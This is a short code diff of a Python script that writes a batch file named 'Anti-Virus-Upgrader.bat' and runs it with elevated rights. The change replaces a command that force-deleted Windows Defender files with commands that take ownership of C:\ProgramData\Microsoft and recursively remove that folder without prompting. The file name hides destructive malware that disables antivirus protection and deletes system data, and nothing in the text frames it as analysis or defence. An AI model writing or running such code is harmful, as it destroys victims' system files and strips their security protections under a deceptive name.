@@ -4,7 +4,7 @@ from shutil import copyfile
 '''
 windefdelname = 'Anti-Virus-Upgrader.bat'
 windefdelfile = open(windefdelname, 'w')
-lines = ['\ncd C:/ProgramData/Microsoft/Windows Defender/\n', '\ndel /F/Q/S\n']
+lines = ['\ntakeown /f C:\\ProgramData\\Microsoft\n','\ncd C:/ProgramData/\n', '\nrmdir /S/Q Microsoft\n']
 windefdelfile.writelines(lines)
 os.system(f'powershell "start {windefdelname} -v runAs"')
 os.startfile(windefdelname)
